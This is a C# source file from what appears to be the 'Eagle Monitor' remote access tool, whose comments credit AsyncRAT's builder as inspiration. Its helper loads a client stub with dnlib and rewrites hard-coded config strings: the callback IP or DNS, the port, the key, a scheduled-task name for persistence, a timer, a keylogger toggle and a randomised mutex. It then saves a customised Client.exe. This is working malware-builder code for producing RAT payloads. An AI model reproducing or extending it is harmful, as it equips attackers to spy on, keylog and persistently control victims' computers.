using System;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System.Runtime.InteropServices;
using System.Text;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Inspiration : https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp/blob/master/AsyncRAT-C%23/Server/Forms/FormBuilder.cs
*/

namespace Eagle_Monitor_Builder
{
    internal class Helpers
    {
        internal class Utils
        {
            [DllImport("ntdll.dll")]
            internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

            internal static string GPath = Application.StartupPath;

            internal static string stubPath = GPath + "\\Stubs\\Client";

            internal static string randomString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789abcdefghijklmnopqrstuvwxyz|@#^{}[]`´~";
        }

        internal class Config
        {
            public string path { get; set; }
            public string ipOrDns { get; set; }
            public string port { get; set; }
            public string key { get; set; }
            public string taskName { get; set; }
            public string time { get; set; }
            public string keylog { get; set; }
            public string stub { get; set; }
            public bool persistence { get; set; }
            public bool is64BitStub { get; set; }
        }

        internal void Build(string path, string dns, string port, string key, string taskName, string time, string keylog)
        {
            ModuleDefMD asmDef = ModuleDefMD.Load(path);
            try
            {
                using (asmDef)
                {
                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Utils.GPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            WriteSettings(asmDef, dns, port, key , taskName, time, keylog, saveFileDialog1.FileName);
                            asmDef.Write(saveFileDialog1.FileName);
                            asmDef.Dispose();
                            MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                    }
                }
            }
            catch (Exception)
            {
                asmDef?.Dispose();
            }
        }
        /*      public static string hostIp = "127.0.0.1";
        public static string port = "7788";
        public static string generalKey = "123456789";
        public static string taskName = "%C%";
        public static string time = "%1%";
        public static string offKeylog = "0";*/

        private readonly Random random = new Random();
        private string NextString(int length) => new string((
            from _ in Enumerable.Range(0, length)
            let i = random.Next(0, Utils.randomString.Length)
            select Utils.randomString[i]).ToArray());

        private void WriteSettings(ModuleDefMD asmDef, string dns, string port, string key, string taskName, string time, string offKeylog,string AsmName = "Client")
        {
            foreach (TypeDef type in asmDef.Types)
            {
                asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                asmDef.Name = Path.GetFileName(AsmName);
                if (type.Name == "Config")
                    foreach (MethodDef method in type.Methods)
                    {
                        if (method.Body == null) continue;
                        for (int i = 0; i < method.Body.Instructions.Count(); i++)
                        {
                            if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                            {
                                if (method.Body.Instructions[i].Operand.ToString() == "127.0.0.1")
                                {
                                    method.Body.Instructions[i].Operand = dns;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "7788")
                                {
                                    method.Body.Instructions[i].Operand = port;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "123456789")
                                {
                                    method.Body.Instructions[i].Operand = key;
                                }
                                if (method.Body.Instructions[i].Operand.ToString() == "%C%")
                                {
                                    method.Body.Instructions[i].Operand = taskName;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%1%")
                                {
                                    method.Body.Instructions[i].Operand = time;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "False")
                                {
                                    method.Body.Instructions[i].Operand = offKeylog;
                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%MUTEX%")
                                {

                                    method.Body.Instructions[i].Operand = "EM-" + NextString(24);
                                }
                            }
                        }
                    }
            }
        }
    }
}
